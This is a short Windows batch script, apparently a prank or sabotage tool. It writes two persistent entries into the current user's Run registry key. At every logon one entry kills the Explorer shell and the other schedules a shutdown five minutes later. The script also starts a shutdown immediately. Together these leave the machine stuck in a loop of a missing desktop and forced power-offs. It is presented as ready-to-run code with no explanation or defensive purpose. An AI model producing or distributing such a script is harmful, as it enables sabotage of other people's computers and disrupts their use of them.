@ echo off
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V uselinux1 /T REG_SZ /D "taskkill -f /im explorer.exe" /F
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V uselinux2 /T REG_SZ /D "shutdown -s -t 300" /F
shutdown -s -t 300
exit